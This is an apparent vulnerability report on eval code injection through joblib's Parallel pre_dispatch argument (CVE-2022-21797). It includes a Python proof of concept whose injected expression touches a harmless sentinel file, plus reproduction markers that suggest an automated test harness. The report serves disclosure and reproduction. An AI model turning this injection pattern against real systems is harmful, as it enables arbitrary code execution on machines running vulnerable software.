report.title: eval code injection in joblib
report.body:
I found a eval code injection vulnerability in joblib 1.1.0.

Eval code injection: parallel(pre_dispatch=...) passes the value to eval() unsanitized.

Tracked as CVE-2022-21797 (GHSA-6hrg-qmvc-2xh8).

Proof of concept:

```python
import os, tempfile
from joblib import Parallel, delayed
sentinel = os.path.join(tempfile.gettempdir(), "slopgate_joblib")
try: os.remove(sentinel)
except OSError: pass
def f(): return 1
pl = "__import__('pathlib').Path(r'%s').touch()" % sentinel
try: Parallel(n_jobs=2, pre_dispatch=pl)(delayed(f)() for _ in range(3))
except Exception as e: print("raised:", type(e).__name__)
print("SLOPGATE:REPRODUCED" if os.path.exists(sentinel) else "SLOPGATE:NOT_REPRODUCED")
```
